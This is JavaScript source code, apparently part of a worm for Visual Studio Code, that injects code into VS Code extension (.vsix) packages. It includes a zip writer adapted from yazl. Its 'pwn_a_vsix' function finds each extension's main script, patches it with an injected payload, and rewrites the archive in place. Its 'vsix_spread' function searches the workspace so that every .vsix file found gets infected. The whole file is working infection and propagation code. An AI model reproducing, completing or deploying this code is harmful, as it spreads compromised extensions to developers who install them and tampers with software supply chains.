/*
 *  nightmare nightmare nightmare
 *
 *  vsix patcher!
 */

const eocd_sig = 0x6054b50;
const eocd_size_off = 12;
const eocd_start_off = 16;

const cdfh_comp_size_off = 20;
const cdfh_fn_len_off = 28;
const cdfh_lh_off = 42;
const cdfh_fn_off = 46;

const lh_fn_off = 30;

const lh_uncomp_size_off = 22;
const buffer_allocunsafe = Buffer.allocUnsafe;

//YAZL
function prepareBuffer(buffer) {
	buffer.w6 = buffer.writeUInt16LE;
	buffer.w2 = buffer.writeUInt32LE;
	buffer.r8 = buffer.readUInt8;
	buffer.w8 = buffer.writeUInt8;
	buffer.r6 = buffer.readUInt16LE;
	buffer.r2 = buffer.readUInt32LE;
	return buffer;
}

util.inherits(ZipFile, EventEmitter);
function ZipFile() {
	this.outputStream = new PassThrough();
	this.entries = [];
	this.outputStreamCursor = 0;
	this.ended = false; // .end() sets this
	this.allDone = false; // set when we've written the last bytes
};

ZipFile.prototype.addBuffer = function(buffer, metadataPath) {
	var self = this;

	var entry = new Entry(metadataPath, false);
	entry.uncompressedSize = buffer.length;
	entry.crc32 = zlib["crc32"](buffer);
	entry.crcAndFileSizeKnown = true;
	self.entries.push(entry);
	zlib.deflateRaw(buffer, {level:6}, function(err, compressedBuffer) {
			setCompressedBuffer(compressedBuffer);
		});
	function setCompressedBuffer(compressedBuffer) {
		entry.compressedSize = compressedBuffer.length;
		entry.setFileDataPumpFunction(function() {
			writeToOutputStream(self, compressedBuffer);
			writeToOutputStream(self, entry.getDataDescriptor());
			entry.state = Entry.FILE_DATA_DONE;

			// don't call pumpEntries() recursively.
			// (also, don't call process.nextTick recursively.)
			setImmediate(function() {
				pumpEntries(self);
			});
		});
		pumpEntries(self);
	}
};

ZipFile.prototype.end = function() {
	if (this.ended) return;
	this.ended = true;
	this.comment = EMPTY_BUFFER;
	pumpEntries(this);
};

function writeToOutputStream(self, buffer) {
	self.outputStream.write(buffer);
	self.outputStreamCursor += buffer.length;
}

function pumpEntries(self) {
	if (self.allDone) return;

	// pump entries
	var entry = getFirstNotDoneEntry();
	function getFirstNotDoneEntry() {
		for (var i = 0; i < self.entries.length; i++) {
			var entry = self.entries[i];
			if (entry.state < Entry.FILE_DATA_DONE) return entry;
		}
		return null;
	}
	if (entry != null) {
		// this entry is not done yet
		if (entry.state < Entry.READY_TO_PUMP_FILE_DATA) return; // input file not open yet
		if (entry.state === Entry.FILE_DATA_IN_PROGRESS) return; // we'll get there
		// start with local file header
		entry.relativeOffsetOfLocalHeader = self.outputStreamCursor;
		var localFileHeader = entry.getLocalFileHeader();
		writeToOutputStream(self, localFileHeader);
		entry.doFileDataPump();
	} else {
		// all cought up on writing entries
		if (self.ended) {
			// head for the exit
			self.offsetOfStartOfCentralDirectory = self.outputStreamCursor;
			self.entries.forEach(function(entry) {
				var centralDirectoryRecord = entry.getCentralDirectoryRecord();
				writeToOutputStream(self, centralDirectoryRecord);
			});
			writeToOutputStream(self, getEndOfCentralDirectoryRecord(self));
			self.outputStream.end();
			self.allDone = true;
		}
	}
}

var ZIP64_END_OF_CENTRAL_DIRECTORY_RECORD_SIZE = 56;
var ZIP64_END_OF_CENTRAL_DIRECTORY_LOCATOR_SIZE = 20;
var END_OF_CENTRAL_DIRECTORY_RECORD_SIZE = 22;
function getEndOfCentralDirectoryRecord(self) {
	var needZip64Format = false;
	var normalEntriesLength = self.entries.length;
	if (self.entries.length >= 0xffff) {
		normalEntriesLength = 0xffff;
		needZip64Format = true;
	}
	var sizeOfCentralDirectory = self.outputStreamCursor - self.offsetOfStartOfCentralDirectory;
	var normalSizeOfCentralDirectory = sizeOfCentralDirectory;
	var normalOffsetOfStartOfCentralDirectory = self.offsetOfStartOfCentralDirectory;

	var eocdrBuffer = prepareBuffer(buffer_allocunsafe(END_OF_CENTRAL_DIRECTORY_RECORD_SIZE + self.comment.length));
	// end of central dir signature                       4 bytes  (0x06054b50)
	eocdrBuffer.w2(0x06054b50, 0);
	// number of this disk                                2 bytes
	eocdrBuffer.w6(0, 4);
	// number of the disk with the start of the central directory  2 bytes
	eocdrBuffer.w6(0, 6);
	// total number of entries in the central directory on this disk  2 bytes
	eocdrBuffer.w6(normalEntriesLength, 8);
	// total number of entries in the central directory   2 bytes
	eocdrBuffer.w6(normalEntriesLength, 10);
	// size of the central directory                      4 bytes
	eocdrBuffer.w2(normalSizeOfCentralDirectory, 12);
	// offset of start of central directory with respect to the starting disk number  4 bytes
	eocdrBuffer.w2(normalOffsetOfStartOfCentralDirectory, 16);
	// .ZIP file comment                                  (variable size)
	self.comment.copy(eocdrBuffer, 22);

	if (!needZip64Format) return eocdrBuffer;

	// ZIP64 format
	// ZIP64 End of Central Directory Record
	var zip64EocdrBuffer = prepareBuffer(buffer_allocunsafe(ZIP64_END_OF_CENTRAL_DIRECTORY_RECORD_SIZE));
	// zip64 end of central dir signature                                             4 bytes  (0x06064b50)
	zip64EocdrBuffer.w2(0x06064b50, 0);
	// size of zip64 end of central directory record                                  8 bytes
	writeUInt64LE(zip64EocdrBuffer, ZIP64_END_OF_CENTRAL_DIRECTORY_RECORD_SIZE - 12, 4);
	// version made by                                                                2 bytes
	zip64EocdrBuffer.w6(VERSION_MADE_BY, 12);
	// version needed to extract                                                      2 bytes
	zip64EocdrBuffer.w6(VERSION_NEEDED_TO_EXTRACT_ZIP64, 14);
	// number of this disk                                                            4 bytes
	zip64EocdrBuffer.w2(0, 16);
	// number of the disk with the start of the central directory                     4 bytes
	zip64EocdrBuffer.w2(0, 20);
	// total number of entries in the central directory on this disk                  8 bytes
	writeUInt64LE(zip64EocdrBuffer, self.entries.length, 24);
	// total number of entries in the central directory                               8 bytes
	writeUInt64LE(zip64EocdrBuffer, self.entries.length, 32);
	// size of the central directory                                                  8 bytes
	writeUInt64LE(zip64EocdrBuffer, sizeOfCentralDirectory, 40);
	// offset of start of central directory with respect to the starting disk number  8 bytes
	writeUInt64LE(zip64EocdrBuffer, self.offsetOfStartOfCentralDirectory, 48);
	// zip64 extensible data sector                                                   (variable size)
	// nothing in the zip64 extensible data sector


	// ZIP64 End of Central Directory Locator
	var zip64EocdlBuffer = prepareBuffer(buffer_allocunsafe(ZIP64_END_OF_CENTRAL_DIRECTORY_LOCATOR_SIZE));
	// zip64 end of central dir locator signature                               4 bytes  (0x07064b50)
	zip64EocdlBuffer.w2(0x07064b50, 0);
	// number of the disk with the start of the zip64 end of central directory  4 bytes
	zip64EocdlBuffer.w2(0, 4);
	// relative offset of the zip64 end of central directory record             8 bytes
	writeUInt64LE(zip64EocdlBuffer, self.outputStreamCursor, 8);
	// total number of disks                                                    4 bytes
	zip64EocdlBuffer.w2(1, 16);

	return Buffer.concat([
		zip64EocdrBuffer,
		zip64EocdlBuffer,
		eocdrBuffer,
	]);
}

var EMPTY_BUFFER = prepareBuffer(buffer_allocunsafe(0));

// this class is not part of the public API
function Entry(metadataPath, isDirectory) {
	this.utf8FileName = Buffer.from(metadataPath);
	this.isDirectory = isDirectory;
	this.state = Entry.WAITING_FOR_METADATA;
		this.setFileAttributesMode(isDirectory ? 0o40775 : 0o100777);

		if (isDirectory) {
		this.crcAndFileSizeKnown = true;
		this.crc32 = 0;
		this.uncompressedSize = 0;
		this.compressedSize = 0;
	} else {
		// unknown so far
		this.crcAndFileSizeKnown = false;
		this.crc32 = null;
		this.uncompressedSize = null;
		this.compressedSize = null;
	}
	
	this.compressionLevel = this.isDirectory ? 0 : 6;
		// no comment.
		this.fileComment = EMPTY_BUFFER;
}
Entry.WAITING_FOR_METADATA = 0;
Entry.READY_TO_PUMP_FILE_DATA = 1;
Entry.FILE_DATA_IN_PROGRESS = 2;
Entry.FILE_DATA_DONE = 3;
Entry.prototype.setFileAttributesMode = function(mode) {
	// http://unix.stackexchange.com/questions/14705/the-zip-formats-external-file-attribute/14727#14727
	this.externalFileAttributes = (mode << 16) >>> 0;
};
// doFileDataPump() should not call pumpEntries() directly. see issue #9.
Entry.prototype.setFileDataPumpFunction = function(doFileDataPump) {
	this.doFileDataPump = doFileDataPump;
	this.state = Entry.READY_TO_PUMP_FILE_DATA;
};
Entry.prototype.useZip64Format = () => {return this.forceZip64Format};
var LOCAL_FILE_HEADER_FIXED_SIZE = 30;
var VERSION_NEEDED_TO_EXTRACT_UTF8 = 20;
var VERSION_NEEDED_TO_EXTRACT_ZIP64 = 45;
// 3 = unix. 63 = spec version 6.3
var VERSION_MADE_BY = (3 << 8) | 63;
var FILE_NAME_IS_UTF8 = 1 << 11;
var UNKNOWN_CRC32_AND_FILE_SIZES = 1 << 3;
Entry.prototype.getLocalFileHeader = function() {
	var crc32 = 0;
	var compressedSize = 0;
	var uncompressedSize = 0;
	if (this.crcAndFileSizeKnown) {
		crc32 = this.crc32;
		compressedSize = this.compressedSize;
		uncompressedSize = this.uncompressedSize;
	}

	var fixedSizeStuff = prepareBuffer(buffer_allocunsafe(LOCAL_FILE_HEADER_FIXED_SIZE));
	var generalPurposeBitFlag = FILE_NAME_IS_UTF8;
	if (!this.crcAndFileSizeKnown) generalPurposeBitFlag |= UNKNOWN_CRC32_AND_FILE_SIZES;

	// local file header signature     4 bytes  (0x04034b50)
	fixedSizeStuff.w2(0x04034b50, 0);
	// version needed to extract       2 bytes
	fixedSizeStuff.w6(VERSION_NEEDED_TO_EXTRACT_UTF8, 4);
	// general purpose bit flag        2 bytes
	fixedSizeStuff.w6(generalPurposeBitFlag, 6);
	// compression method              2 bytes
	fixedSizeStuff.w6(this.isDirectory?0:8, 8);
	// crc-32                          4 bytes
	fixedSizeStuff.w2(crc32, 14);
	// compressed size                 4 bytes
	fixedSizeStuff.w2(compressedSize, 18);
	// uncompressed size               4 bytes
	fixedSizeStuff.w2(uncompressedSize, 22);
	// file name length                2 bytes
	fixedSizeStuff.w6(this.utf8FileName.length, 26);
	// extra field length              2 bytes
	fixedSizeStuff.w6(0, 28);
	return Buffer.concat([
		fixedSizeStuff,
		// file name (variable size)
		this.utf8FileName,
		// extra field (variable size)
		// no extra fields
	]);
};
var DATA_DESCRIPTOR_SIZE = 16;
var ZIP64_DATA_DESCRIPTOR_SIZE = 24;
Entry.prototype.getDataDescriptor = function() {
	if (this.crcAndFileSizeKnown) {
		// the Mac Archive Utility requires this not be present unless we set general purpose bit 3
		return EMPTY_BUFFER;
	}
	if (!this.useZip64Format()) {
		var buffer = prepareBuffer(buffer_allocunsafe(DATA_DESCRIPTOR_SIZE));
		// optional signature (required according to Archive Utility)
		buffer.w2(0x08074b50, 0);
		// crc-32                          4 bytes
		buffer.w2(this.crc32, 4);
		// compressed size                 4 bytes
		buffer.w2(this.compressedSize, 8);
		// uncompressed size               4 bytes
		buffer.w2(this.uncompressedSize, 12);
		return buffer;
	} else {
		// ZIP64 format
		var buffer = prepareBuffer(buffer_allocunsafe(ZIP64_DATA_DESCRIPTOR_SIZE));
		// optional signature (unknown if anyone cares about this)
		buffer.w2(0x08074b50, 0);
		// crc-32                          4 bytes
		buffer.w2(this.crc32, 4);
		// compressed size                 8 bytes
		writeUInt64LE(buffer, this.compressedSize, 8);
		// uncompressed size               8 bytes
		writeUInt64LE(buffer, this.uncompressedSize, 16);
		return buffer;
	}
};
var CENTRAL_DIRECTORY_RECORD_FIXED_SIZE = 46;
var ZIP64_EXTENDED_INFORMATION_EXTRA_FIELD_SIZE = 28;
Entry.prototype.getCentralDirectoryRecord = function() {
	var fixedSizeStuff = prepareBuffer(buffer_allocunsafe(CENTRAL_DIRECTORY_RECORD_FIXED_SIZE));
	var generalPurposeBitFlag = FILE_NAME_IS_UTF8;
	if (!this.crcAndFileSizeKnown) generalPurposeBitFlag |= UNKNOWN_CRC32_AND_FILE_SIZES;

	var normalCompressedSize = this.compressedSize;
	var normalUncompressedSize = this.uncompressedSize;
	var normalRelativeOffsetOfLocalHeader = this.relativeOffsetOfLocalHeader;
	var versionNeededToExtract = VERSION_NEEDED_TO_EXTRACT_UTF8;
	var zeiefBuffer = EMPTY_BUFFER;
	if (this.useZip64Format()) {
		normalCompressedSize = 0xffffffff;
		normalUncompressedSize = 0xffffffff;
		normalRelativeOffsetOfLocalHeader = 0xffffffff;
		versionNeededToExtract = VERSION_NEEDED_TO_EXTRACT_ZIP64;

		// ZIP64 extended information extra field
		zeiefBuffer = prepareBuffer(buffer_allocunsafe(ZIP64_EXTENDED_INFORMATION_EXTRA_FIELD_SIZE));
		// 0x0001                  2 bytes    Tag for this "extra" block type
		zeiefBuffer.w6(0x0001, 0);
		// Size                    2 bytes    Size of this "extra" block
		zeiefBuffer.w6(ZIP64_EXTENDED_INFORMATION_EXTRA_FIELD_SIZE - 4, 2);
		// Original Size           8 bytes    Original uncompressed file size
		writeUInt64LE(zeiefBuffer, this.uncompressedSize, 4);
		// Compressed Size         8 bytes    Size of compressed data
		writeUInt64LE(zeiefBuffer, this.compressedSize, 12);
		// Relative Header Offset  8 bytes    Offset of local header record
		writeUInt64LE(zeiefBuffer, this.relativeOffsetOfLocalHeader, 20);
		// Disk Start Number       4 bytes    Number of the disk on which this file starts
		// (omit)
	}

	// central file header signature   4 bytes  (0x02014b50)
	fixedSizeStuff.w2(0x02014b50, 0);
	// version made by                 2 bytes
	fixedSizeStuff.w6(VERSION_MADE_BY, 4);
	// version needed to extract       2 bytes
	fixedSizeStuff.w6(versionNeededToExtract, 6);
	// general purpose bit flag        2 bytes
	fixedSizeStuff.w6(generalPurposeBitFlag, 8);
	// compression method              2 bytes
	fixedSizeStuff.w6(this.isDirectory?0:8, 10);
	// crc-32                          4 bytes
	fixedSizeStuff.w2(this.crc32, 16);
	// compressed size                 4 bytes
	fixedSizeStuff.w2(normalCompressedSize, 20);
	// uncompressed size               4 bytes
	fixedSizeStuff.w2(normalUncompressedSize, 24);
	// file name length                2 bytes
	fixedSizeStuff.w6(this.utf8FileName.length, 28);
	// file comment length             2 bytes
	fixedSizeStuff.w6(this.fileComment.length, 32);
	// disk number start               2 bytes
	fixedSizeStuff.w6(0, 34);
	// internal file attributes        2 bytes
	fixedSizeStuff.w6(0, 36);
	// external file attributes        4 bytes
	fixedSizeStuff.w2(this.externalFileAttributes, 38);
	// relative offset of local header 4 bytes
	fixedSizeStuff.w2(normalRelativeOffsetOfLocalHeader, 42);

	return Buffer.concat([
		fixedSizeStuff,
		// file name (variable size)
		this.utf8FileName,
		zeiefBuffer,
		// file comment (variable size)
		this.fileComment,
	]);
};

function writeUInt64LE(buffer, n, offset) {
	// can't use bitshift here, because JavaScript only allows bitshifting on 32-bit integers.
	var high = Math.floor(n / 0x100000000);
	var low = n >>> 0;
	buffer.w2(low, offset);
	buffer.w2(high, offset + 4);
}

//ENDYAZL

function pwn_a_vsix(fname) {
    let zip = prepareBuffer(fs.readFileSync(fname));
	let pwnage = sentinel_pwn();

	let l = zip.length;
	let eocd_off = l - 22;

	let eocd = zip.r2(eocd_off);

	while (eocd != eocd_sig) {
		eocd_off--;
		eocd = zip.r2(eocd_off);
	}

	let cdfh_size = zip.r2(eocd_off + eocd_size_off);
	let cdfh_start = zip.r2(eocd_off + eocd_start_off);
	let cdfh = cdfh_start;

	let pack_json;
	let pack_off;
//	let ext_manif_off;

	let main;

	let cdfh_fn_len;

	let z = new ZipFile();

	let ts = 0;

	while (cdfh < cdfh_start + cdfh_size) {
		cdfh_fn_len = zip.r2(cdfh + cdfh_fn_len_off);
		let cdfh_fn = zip.slice(cdfh + cdfh_fn_off, cdfh + cdfh_fn_off + cdfh_fn_len).toString();
		let lh_loc = zip.r2(cdfh + cdfh_lh_off);
		let lh_comp_size = zip.r2(cdfh + cdfh_comp_size_off);
		let lh_uncomp_size = zip.r2(lh_loc + lh_uncomp_size_off);
		let wdeflate = (zip.r8(cdfh + 9) & 8) == 8;
		let wpatch;

		if (wdeflate) {
			wpatch = zlib.inflateRawSync(zip.slice(lh_loc + lh_fn_off + cdfh_fn_len, lh_loc + lh_fn_off + cdfh_fn_len + lh_comp_size));
		} else {
			wpatch = zip.slice(lh_loc + lh_fn_off + cdfh_fn_len, lh_loc + lh_fn_off + cdfh_fn_len + lh_uncomp_size);
		}

		if (cdfh_fn == "extension.vsixmanifest") {
//			ext_manif_off = lh_loc;

			let ext_manif = wpatch;

			pack_json = ext_manif.toString().match(/Manifest" Path="(.*?)"/)[1];
		}

		if (cdfh_fn == pack_json) {
			pack_off = lh_loc;

			let pack = wpatch;
			pack = JSON.parse(pack);

			main = path.normalize(path.dirname(pack_json) + "/" + pack["main"]);

			//console.log(main)
		}

		if (cdfh_fn == main) {
			//console.log("found it!");

			wpatch = pwn_ext_buf(wpatch);
			if (!wpatch) return;
		}

		ts += wpatch.length;

		z.addBuffer(wpatch, cdfh_fn);

		cdfh += cdfh_fn_len + cdfh_fn_off;
	}

	z.outputStream.pipe(fs.createWriteStream(fname)).on("close", () => {
			//console.log("pwnd?");
	});

	z.end();
}

// XXX find an efficient method to find vsixs outside of workspaces
function vsix_spread() {
	vscode["workspace"]["findFiles"]("**/{*.vsix}", "**/node_modules/**")["then"]((ev) => {
		for (var el of ev) {
			pwn_a_vsix(el.path);
		}
	});    
}